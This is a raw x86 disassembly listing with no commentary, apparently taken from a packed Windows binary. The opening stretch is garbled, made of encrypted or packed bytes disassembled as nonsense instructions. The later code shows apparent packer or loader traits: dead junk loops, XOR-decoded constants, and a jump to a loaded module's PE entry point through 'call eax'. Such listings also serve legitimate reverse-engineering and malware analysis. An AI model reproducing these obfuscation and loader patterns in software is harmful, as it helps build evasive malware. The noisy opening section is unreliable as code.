  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    ch,BYTE PTR [edx-0x2616152c]
  409ad3:	loop   0x409b45
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409b0e
  409adb:	sar    DWORD PTR [ebp+0x41a8edfe],0x55
  409ae2:	(bad)  
  409ae3:	imul   ecx,DWORD PTR ds:[ecx-0x2754edb0],0xffffff86
  409aeb:	mov    edi,0x9faead47
  409af0:	scas   eax,DWORD PTR es:[edi]
  409af1:	sbb    al,0xb8
  409af3:	sbb    ah,bl
  409af5:	mov    esp,0x1d00b87a
  409afa:	mov    bh,0x12
  409afc:	mov    edx,0x89c1e0c7
  409b01:	int    0x83
  409b03:	sub    ecx,edi
  409b05:	push   ds
  409b06:	cmp    ebp,DWORD PTR [edx+0x7ec9a81b]
  409b0c:	sub    BYTE PTR [edi],ah
  409b0e:	jl     0x409af8
  409b10:	dec    esp
  409b11:	push   ebx
  409b12:	jge    0x409b14
  409b14:	push   esi
  409b15:	or     DWORD PTR [esi],eax
  409b17:	std    
  409b18:	adc    BYTE PTR [esp+ecx*4+0xb356b87],bh
  409b1f:	lock lds edi,FWORD PTR [ecx-0x1c138084]
  409b26:	adc    al,0xb4
  409b28:	xacquire xchg BYTE PTR [esi+0x9],cl
  409b2c:	jmp    0x9b70:0xa6bfa63
  409b33:	xchg   ecx,eax
  409b34:	dec    BYTE PTR [ebx]
  409b36:	xchg   edi,eax
  409b37:	imul   ebx,DWORD PTR [edi+ecx*2-0x60],0x63
  409b3c:	jno    0x409bb6
  409b3e:	(bad)  
  409b3f:	sub    edx,DWORD PTR [esi+0x5d]
  409b42:	cmp    BYTE PTR [ebx+0x5c13e9ab],cl
  409b48:	push   cs
  409b49:	cmp    al,0xb
  409b4b:	cmp    al,0x8d
  409b4d:	shr    BYTE PTR [ebx+0x79],cl
  409b50:	cmp    dl,BYTE PTR [edx-0x272c963e]
  409b56:	je     0x409b4f
  409b58:	outs   dx,BYTE PTR ss:[esi]
  409b5a:	inc    ebp
  409b5b:	data16 (bad) 
  409b5d:	repnz daa 
  409b5f:	push   ecx
  409b60:	sbb    ecx,ebp
  409b62:	lods   al,BYTE PTR ds:[esi]
  409b63:	jbe    0x409af6
  409b65:	daa    
  409b66:	aad    0xa2
  409b68:	bound  esp,QWORD PTR [esi-0x408eac2a]
  409b6e:	fwait
  409b6f:	pop    edx
  409b70:	xor    BYTE PTR [eax+0x43],ch
  409b73:	push   esi
  409b74:	(bad)  
  409b75:	addr16 jmp 0x409b1a
  409b78:	out    0x30,al
  409b7a:	xchg   esp,eax
  409b7b:	dec    esi
  409b7c:	dec    esp
  409b7d:	(bad)  
  409b7e:	xlat   BYTE PTR ds:[ebx]
  409b7f:	aaa    
  409b80:	cmp    dl,0x30
  409b83:	ss ins BYTE PTR es:[edi],dx
  409b85:	mov    esp,0x5d5efa4e
  409b8a:	je     0x409b5a
  409b8c:	(bad)  
  409b8e:	and    al,0x5a
  409b90:	push   edx
  409b91:	add    DWORD PTR [ecx],ebp
  409b93:	test   eax,0x1f393a53
  409b98:	mov    esi,0x4e89588f
  409b9d:	data16 mov dh,0xcb
  409ba0:	lock cdq 
  409ba2:	shr    DWORD PTR [ebx+0x40],0x65
  409ba6:	xchg   BYTE PTR [eax+eax*8],dl
  409ba9:	mov    bl,0x69
  409bab:	pop    edx
  409bac:	inc    ebp
  409bad:	push   eax
  409bae:	cld    
  409baf:	scas   al,BYTE PTR es:[edi]
  409bb0:	xor    BYTE PTR [ebp-0x3],al
  409bb3:	jne    0x409bde
  409bb5:	and    ch,BYTE PTR [esp+edx*1]
  409bb8:	popf   
  409bb9:	sti    
  409bba:	cli    
  409bbb:	stos   DWORD PTR es:[edi],eax
  409bbc:	(bad)
  409bbf:	cmp    al,0x1d
  409bc1:	and    ecx,DWORD PTR [ebx+0x17]
  409bc4:	retf   0xc675
  409bc7:	jp     0x409c14
  409bc9:	add    eax,0x4967721
  409bce:	add    BYTE PTR [ebp+0x47],bl
  409bd1:	sbb    DWORD PTR [ecx+0x64],esi
  409bd4:	idiv   DWORD PTR [ecx-0x44]
  409bd7:	pop    ecx
  409bd8:	jp     0x409c2b
  409bda:	ja     0x409b66
  409bdc:	sbb    eax,0xe25ceffe
  409be1:	ins    DWORD PTR es:[edi],dx
  409be2:	aaa    
  409be3:	mov    gs:0x74ae0006,eax
  409be9:	jmp    0x49a66aa6
  409bee:	loop   0x409bca
  409bf0:	and    DWORD PTR [eax+0x7488d62b],0x6d
  409bf7:	and    al,0x1
  409bf9:	inc    edi
  409bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bfb:	jecxz  0x409be6
  409bfd:	lock mov eax,0x753b1913
  409c03:	push   edi
  409c04:	mov    edi,0x8f7ad928
  409c09:	inc    esi
  409c0a:	inc    edi
  409c0b:	dec    ecx
  409c0c:	mov    ecx,0x25a60264
  409c11:	aam    0x90
  409c13:	retf   
  409c14:	xchg   DWORD PTR [edi+0x6f],edx
  409c17:	ficomp WORD PTR [esi+esi*8-0x22db3c4a]
  409c1e:	fs call 0x95ad7992
  409c24:	xchg   esi,eax
  409c25:	int3   
  409c26:	nop    DWORD PTR ds:0xb23ca088
  409c2d:	mov    dh,0xda
  409c2f:	gs inc esi
  409c31:	(bad)  
  409c32:	cmp    bh,cl
  409c34:	inc    esi
  409c35:	sub    ah,BYTE PTR [ebx]
  409c37:	test   DWORD PTR [esi-0x45],0x50730397
  409c3e:	jne    0x409c11
  409c40:	cmp    DWORD PTR gs:[ebp+0xa9042cb],0x38b9b8f1
  409c4b:	inc    esi
  409c4c:	popa   
  409c4d:	(bad)  
  409c4e:	sub    ebp,DWORD PTR [edx-0x26]
  409c51:	cli    
  409c52:	sbb    al,bl
  409c54:	int    0x2
  409c56:	(bad)  
  409c57:	cmp    ebx,esp
  409c59:	repnz sbb cl,BYTE PTR [ebx+0x3e3f5973]
  409c60:	push   ecx
  409c61:	jle    0x409cb8
  409c63:	mov    ?,WORD PTR [edx-0x62]
  409c66:	push   edi
  409c67:	mov    esi,0xdd580ad1
  409c6c:	push   ss
  409c6d:	mov    ds:0xfaf64edc,eax
  409c72:	adc    BYTE PTR [ebp+edi*2-0x66],dh
  409c76:	push   edi
  409c77:	fnstcw WORD PTR [edi+0x4d3f5fa4]
  409c7d:	push   edi
  409c7e:	loope  0x409cdf
  409c80:	frstor [ebx+0x67c3fc5d]
  409c86:	add    al,0x31
  409c88:	enter  0x96ee,0x31
  409c8c:	loop   0x409cef
  409c8e:	out    dx,eax
  409c8f:	push   ss
  409c90:	mov    edx,es
  409c92:	push   ds
  409c93:	mov    ah,0x60
  409c95:	call   0x893f:0xea34a598
  409c9c:	mov    ds:0x6acf2cab,al
  409ca1:	dec    esi
  409ca2:	nop
  409ca3:	(bad)  [eax+esi*8]
  409ca6:	xchg   esp,eax
  409ca7:	mov    al,0x3b
  409ca9:	ret    0x2c9d
  409cac:	ror    DWORD PTR [edi+0x2de6e46e],0xe0
  409cb3:	fadd   DWORD PTR [ebp-0x3aa66d6b]
  409cb9:	fucomi st,st(1)
  409cbb:	sbb    eax,0x2fa742fb
  409cc0:	call   0x9130f420
  409cc5:	xchg   edi,eax
  409cc6:	aad    0x15
  409cc8:	sub    ecx,ecx
  409cca:	xor    dl,BYTE PTR [ebx]
  409ccc:	lds    esi,FWORD PTR [ecx]
  409cce:	and    eax,DWORD PTR [ebx]
  409cd0:	out    0x33,al
  409cd2:	sar    BYTE PTR [edi-0x32729c],1
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
